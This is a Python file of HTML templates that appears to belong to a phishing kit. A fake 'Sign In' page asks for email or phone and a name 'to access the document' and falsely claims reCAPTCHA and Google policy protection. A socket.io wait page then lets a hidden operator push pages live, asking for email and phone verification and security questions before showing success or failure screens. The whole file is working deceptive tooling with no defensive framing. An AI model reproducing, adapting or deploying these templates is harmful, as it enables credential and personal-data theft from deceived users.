# page_templates.py

MAIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In</title>
<style>
*{margin:0; padding:0; box-sizing:border-box; font-family:'Montserrat', sans-serif;}
body{
    margin:auto; width:450px; margin-top:60px; border-radius:10px;
    background-image:url('{{ url_for('static', filename='backgroundblur.png') }}');
    background-size:cover; background-position:center;
}
form{
    width:430px; height:430px; border-radius:0px; background-color:#ffffff;
    display:flex; flex-direction:column; padding:40px;
}
form h1{font-size:35px; margin:7px;}
form p{font-size:12px;}
form span{font-size:12px; margin-top:20px;}
form input{
    outline:none; border:none; border-bottom:1.5px solid #000;
    padding:5px; background:none;
}
form input:hover{border-bottom:2px solid rgb(52,122,226);}
.btn1{
    width:80px; margin-top:50px; font-size:11px; border:none;
    border-radius:0px; padding:8px 0px; background:#005da6;
    color:#fff; font-weight:bold; margin-left:70%; cursor:pointer; outline:none;
}
.btn1:hover{background:#014b85;}
.end{font-size:10px; color:grey; margin-top:30px;}
a{text-decoration:none; color:blue; font-weight:bold;}
</style>
</head>
<body>
<div class="right-side">
    <form method="POST">
        <h1>Sign In</h1>
        <p>To Access the <a href="#">Document</a></p>
        <span>Email address / Number</span>
        <input type="text" name="email" required>
        <span>Name</span>
        <input type="text" name="name" required>
        <button class="btn1" type="submit">Continue</button>
        <p class="end">
            Protected by reCAPTCHA and subject to the Google <a href="#">Privacy Policy</a>
            and <a href="#">Terms of service</a>
        </p>
    </form>
</div>
</body>
</html>
"""


WAIT_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Please Wait...</title>
<style>
*{margin:0; padding:0; box-sizing:border-box; font-family:'Montserrat', sans-serif;}
body{
    margin:auto; width:450px; margin-top:60px; border-radius:10px;
    background-image:url('{{ url_for('static', filename='backgroundblur.png') }}');
    background-size:cover; background-position:center;
    display:flex; justify-content:center; align-items:center; height:90vh;
}
#page-container{
    width:430px; background:#fff; padding:40px; border-radius:0px;
    display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center;
}
.spinner{border:4px solid #ccc; border-top:4px solid #005da6; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin-bottom:15px;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
</style>
</head>
<body>
<div id="page-container">
    <div class="spinner"></div>
    <h2>Please wait...</h2>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.min.js"></script>
<script>
var socket = io();
var room_id = "{{ room_id }}";
socket.emit('join_room', room_id);
socket.on('update_page', function(html) {
    document.getElementById("page-container").innerHTML = html;
});
</script>
</body>
</html>
"""


PAGE_6_HTML = """
<div class="spinner" style="border:4px solid #ccc; border-top:4px solid #005da6; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin-bottom:15px;"></div>
<h2>Please wait...</h2>
<style>@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
"""


PAGE_TEMPLATES = {
    "Page 1": """
    <div style="width:430px; background:#fff; padding:20px; border-radius:0px; text-align:left;">
        <form method="POST" action="/verify_email" style="display:flex; flex-direction:column; gap:12px;">
            <input type="hidden" name="room_id" value="{room_id}">
            <h2>📧 Verify Email / Number</h2>
            <p>Please enter the email or number to verify:</p>
            <input type="text" name="verified_email" required>
            <button type="submit">Verify</button>
        </form>
    </div>
    """,

    "Page 2": """
    <div style="width:430px; background:#fff; padding:20px; border-radius:0px; text-align:left;">
        <form method="POST" action="/verify_email">
            <input type="hidden" name="room_id" value="{room_id}">
            <h2>📞 Verify Phone</h2>
            <input type="text" name="verified_email" required>
            <button type="submit">Verify</button>
        </form>
    </div>
    """,

    "Page 3": """
    <div style="width:430px; background:#fff; padding:40px;">
        <h2>📝 Security Questions</h2>
        <p>{greeting}</p>
    </div>
    """,

    "Page 4": """
    <div style="width:430px; background:#fff; padding:40px;">
        <h2>✅ Final Confirmation</h2>
        <p>All details have been verified successfully.</p>
    </div>
    """,

    "Page 5": """
    <div style="width:430px; background:#fff; padding:40px; text-align:center;">
        <h2>❌ Incorrect</h2>
        <form method="GET" action="/">
            <button type="submit">Retry</button>
        </form>
    </div>
    """,

    "Page 6": PAGE_6_HTML,

    "Page 7": """
    <div style="width:430px; background:#fff; padding:40px; text-align:center;">
        <h2>❌ Verification Failed</h2>
        <form method="GET" action="/">
            <button type="submit">Retry</button>
        </form>
    </div>
    """
}
